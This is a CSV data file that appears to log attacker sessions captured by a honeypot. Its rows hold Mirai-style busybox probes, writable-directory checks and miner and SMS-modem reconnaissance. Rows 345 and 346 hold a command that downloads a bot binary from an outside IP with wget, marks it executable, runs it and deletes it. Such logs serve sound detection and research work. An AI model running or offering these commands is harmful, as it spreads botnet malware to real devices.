,session,duration,command_freq,input
203,d77ffde64c08,4.022591114044189,13,rm .s; exit
204,efef1f4f9c64,0.8046431541442871,13,enable
205,efef1f4f9c64,0.8046431541442871,13,system
206,efef1f4f9c64,0.8046431541442871,13,system
207,efef1f4f9c64,0.8046431541442871,13,shell
208,efef1f4f9c64,0.8046431541442871,13,shell
209,efef1f4f9c64,0.8046431541442871,13,sh
210,efef1f4f9c64,0.8046431541442871,13,cat /proc/mounts; /bin/busybox WGWWW
211,efef1f4f9c64,0.8046431541442871,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox WGWWW
212,efef1f4f9c64,0.8046431541442871,13,tftp; wget; /bin/busybox WGWWW
213,efef1f4f9c64,0.8046431541442871,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
214,efef1f4f9c64,0.8046431541442871,13,while read i
215,efef1f4f9c64,0.8046431541442871,13,/bin/busybox WGWWW
216,efef1f4f9c64,0.8046431541442871,13,rm .s; exit
217,9d93ddb044c7,12.278405904769896,5,sh
218,9d93ddb044c7,12.278405904769896,5,shell
219,9d93ddb044c7,12.278405904769896,5,shell
220,9d93ddb044c7,12.278405904769896,5,help
221,9d93ddb044c7,12.278405904769896,5,busybox
222,f494d2afc575,1.455475091934204,13,enable
223,f494d2afc575,1.455475091934204,13,system
224,f494d2afc575,1.455475091934204,13,system
225,f494d2afc575,1.455475091934204,13,shell
226,f494d2afc575,1.455475091934204,13,shell
227,f494d2afc575,1.455475091934204,13,sh
228,f494d2afc575,1.455475091934204,13,cat /proc/mounts; /bin/busybox NUXWH
229,f494d2afc575,1.455475091934204,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NUXWH
230,f494d2afc575,1.455475091934204,13,tftp; wget; /bin/busybox NUXWH
231,f494d2afc575,1.455475091934204,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
232,f494d2afc575,1.455475091934204,13,while read i
233,f494d2afc575,1.455475091934204,13,/bin/busybox NUXWH
234,f494d2afc575,1.455475091934204,13,rm .s; exit
235,e74b9f58c370,1.079039573669433,13,enable
236,e74b9f58c370,1.079039573669433,13,system
237,e74b9f58c370,1.079039573669433,13,system
238,e74b9f58c370,1.079039573669433,13,shell
239,e74b9f58c370,1.079039573669433,13,shell
240,e74b9f58c370,1.079039573669433,13,sh
241,e74b9f58c370,1.079039573669433,13,cat /proc/mounts; /bin/busybox YCYDS
242,e74b9f58c370,1.079039573669433,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YCYDS
243,e74b9f58c370,1.079039573669433,13,tftp; wget; /bin/busybox YCYDS
244,e74b9f58c370,1.079039573669433,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
245,e74b9f58c370,1.079039573669433,13,while read i
246,e74b9f58c370,1.079039573669433,13,/bin/busybox YCYDS
247,e74b9f58c370,1.079039573669433,13,rm .s; exit
248,701864b90d35,80.14842939376831,9,/ip cloud print
249,701864b90d35,80.14842939376831,9,/ip cloud print
250,701864b90d35,80.14842939376831,9,ifconfig
251,701864b90d35,80.14842939376831,9,uname -a
252,701864b90d35,80.14842939376831,9,cat /proc/cpuinfo
253,701864b90d35,80.14842939376831,9,ps | grep '[Mm]iner'
254,701864b90d35,80.14842939376831,9,ps -ef | grep '[Mm]iner'
255,701864b90d35,80.14842939376831,9,ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
256,701864b90d35,80.14842939376831,9,echo Hi | cat -n
257,3bed27ba4719,5.75736665725708,13,enable
258,3bed27ba4719,5.75736665725708,13,system
259,3bed27ba4719,5.75736665725708,13,system
260,3bed27ba4719,5.75736665725708,13,shell
261,3bed27ba4719,5.75736665725708,13,shell
262,3bed27ba4719,5.75736665725708,13,sh
263,3bed27ba4719,5.75736665725708,13,cat /proc/mounts; /bin/busybox RGIUA
264,3bed27ba4719,5.75736665725708,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RGIUA
265,3bed27ba4719,5.75736665725708,13,tftp; wget; /bin/busybox RGIUA
266,3bed27ba4719,5.75736665725708,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
267,3bed27ba4719,5.75736665725708,13,while read i
268,3bed27ba4719,5.75736665725708,13,/bin/busybox RGIUA
269,3bed27ba4719,5.75736665725708,13,rm .s; exit
270,a008676b9e73,1.092103242874145,13,enable
271,a008676b9e73,1.092103242874145,13,system
272,a008676b9e73,1.092103242874145,13,system
273,a008676b9e73,1.092103242874145,13,shell
274,a008676b9e73,1.092103242874145,13,shell
275,a008676b9e73,1.092103242874145,13,sh
276,a008676b9e73,1.092103242874145,13,cat /proc/mounts; /bin/busybox RITPX
277,a008676b9e73,1.092103242874145,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RITPX
278,a008676b9e73,1.092103242874145,13,tftp; wget; /bin/busybox RITPX
279,a008676b9e73,1.092103242874145,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
280,a008676b9e73,1.092103242874145,13,while read i
281,a008676b9e73,1.092103242874145,13,/bin/busybox RITPX
282,a008676b9e73,1.092103242874145,13,rm .s; exit
283,aaff7f4f9a57,4.84981894493103,13,enable
284,aaff7f4f9a57,4.84981894493103,13,system
285,aaff7f4f9a57,4.84981894493103,13,system
286,aaff7f4f9a57,4.84981894493103,13,shell
287,aaff7f4f9a57,4.84981894493103,13,shell
288,aaff7f4f9a57,4.84981894493103,13,sh
289,aaff7f4f9a57,4.84981894493103,13,cat /proc/mounts; /bin/busybox FJUKH
290,aaff7f4f9a57,4.84981894493103,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox FJUKH
291,aaff7f4f9a57,4.84981894493103,13,tftp; wget; /bin/busybox FJUKH
292,aaff7f4f9a57,4.84981894493103,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
293,aaff7f4f9a57,4.84981894493103,13,while read i
294,aaff7f4f9a57,4.84981894493103,13,/bin/busybox FJUKH
295,aaff7f4f9a57,4.84981894493103,13,rm .s; exit
296,d5672d611002,2.672670841217041,4,shell
297,d5672d611002,2.672670841217041,4,shell
298,d5672d611002,2.672670841217041,4,sh
299,d5672d611002,2.672670841217041,4,cat /bin/busybox
300,e5840e902c93,1.659119844436645,13,enable
301,e5840e902c93,1.659119844436645,13,system
302,e5840e902c93,1.659119844436645,13,system
303,e5840e902c93,1.659119844436645,13,shell
304,e5840e902c93,1.659119844436645,13,shell
305,e5840e902c93,1.659119844436645,13,sh
306,e5840e902c93,1.659119844436645,13,cat /proc/mounts; /bin/busybox QKQVW
307,e5840e902c93,1.659119844436645,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox QKQVW
308,e5840e902c93,1.659119844436645,13,tftp; wget; /bin/busybox QKQVW
309,e5840e902c93,1.659119844436645,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
310,e5840e902c93,1.659119844436645,13,while read i
311,e5840e902c93,1.659119844436645,13,/bin/busybox QKQVW
312,e5840e902c93,1.659119844436645,13,rm .s; exit
313,e8ba1750cf5d,2.440993070602417,4,shell
314,e8ba1750cf5d,2.440993070602417,4,shell
315,e8ba1750cf5d,2.440993070602417,4,sh
316,e8ba1750cf5d,2.440993070602417,4,cat /bin/busybox
317,1e57b6232ff2,21.12516522407532,26,shell
318,1e57b6232ff2,21.12516522407532,26,shell
319,1e57b6232ff2,21.12516522407532,26,sh
320,1e57b6232ff2,21.12516522407532,26,>/tmp/.l && cd /tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
321,1e57b6232ff2,21.12516522407532,26,>/run//var/.l && cd /run//var/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
322,1e57b6232ff2,21.12516522407532,26,>/dev/.l && cd /dev/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
323,1e57b6232ff2,21.12516522407532,26,>/mnt/.l && cd /mnt/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
324,1e57b6232ff2,21.12516522407532,26,>/sys/fs/user/.l && cd /sys/fs/user/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
325,5817f66fd82a,2.436866998672485,4,shell
326,5817f66fd82a,2.436866998672485,4,shell
327,5817f66fd82a,2.436866998672485,4,sh
328,1e57b6232ff2,21.12516522407532,26,>/usr/.l && cd /usr/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
329,5817f66fd82a,2.436866998672485,4,cat /bin/busybox
330,1e57b6232ff2,21.12516522407532,26,>/temp/.l && cd /temp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
331,1e57b6232ff2,21.12516522407532,26,>/data/local/tmp/.l && cd /data/local/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
332,1e57b6232ff2,21.12516522407532,26,>/local/.l && cd /local/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
333,1e57b6232ff2,21.12516522407532,26,>/sys/.l && cd /sys/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
334,1e57b6232ff2,21.12516522407532,26,>/etc/.l && cd /etc/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
335,1e57b6232ff2,21.12516522407532,26,>/media/.l && cd /media/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
336,1e57b6232ff2,21.12516522407532,26,>/www/.l && cd /www/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
337,1e57b6232ff2,21.12516522407532,26,>/var/tmp/.l && cd /var/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
338,1e57b6232ff2,21.12516522407532,26,>/dev/shm/.l && cd /dev/shm/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
339,1e57b6232ff2,21.12516522407532,26,>/dev/netslink/.l && cd /dev/netslink/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
340,1e57b6232ff2,21.12516522407532,26,>/boot/.l && cd /boot/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
341,1e57b6232ff2,21.12516522407532,26,/bin/busybox wget || wget; /bin/busybox tftp || tftp; /bin/busybox ftpget || ftpget; echo -en '\x45\x43\x48\x4f\x5f\x44\x4f\x4e\x45'
342,1e57b6232ff2,21.12516522407532,26,wget
343,1e57b6232ff2,21.12516522407532,26,tftp
344,1e57b6232ff2,21.12516522407532,26,ftpget
345,1e57b6232ff2,21.12516522407532,26,/bin/busybox wget http://185.243.56.167/bot_ia_64_el -O- > .f; chmod 777 .f || (cp /proc/self/exe .m && > .m && cat .f > .m && (rm -rf .f || rm .f) && cp .m .f && (rm -rf .m || rm .f)); ./.f wget.ia_64; (rm -rf .f || rm .f); (rm -rf .m || rm .m)
346,1e57b6232ff2,21.12516522407532,26,wget http://185.243.56.167/bot_ia_64_el -O-
347,ed40208d2bbc,2.408712387084961,4,shell
348,ed40208d2bbc,2.408712387084961,4,shell
349,ed40208d2bbc,2.408712387084961,4,sh
350,ed40208d2bbc,2.408712387084961,4,cat /bin/busybox
351,ce2d6c9a590a,21.06158757209778,26,shell
352,ce2d6c9a590a,21.06158757209778,26,shell
353,ce2d6c9a590a,21.06158757209778,26,sh
354,ce2d6c9a590a,21.06158757209778,26,>/tmp/.l && cd /tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
355,ce2d6c9a590a,21.06158757209778,26,>/run//var/.l && cd /run//var/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
356,ce2d6c9a590a,21.06158757209778,26,>/dev/.l && cd /dev/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
357,ce2d6c9a590a,21.06158757209778,26,>/mnt/.l && cd /mnt/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
358,ce2d6c9a590a,21.06158757209778,26,>/sys/fs/user/.l && cd /sys/fs/user/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
359,c2c06d212c26,2.401838302612304,4,shell
360,c2c06d212c26,2.401838302612304,4,shell
361,c2c06d212c26,2.401838302612304,4,sh
362,ce2d6c9a590a,21.06158757209778,26,>/usr/.l && cd /usr/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
363,c2c06d212c26,2.401838302612304,4,cat /bin/busybox
364,ce2d6c9a590a,21.06158757209778,26,>/temp/.l && cd /temp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
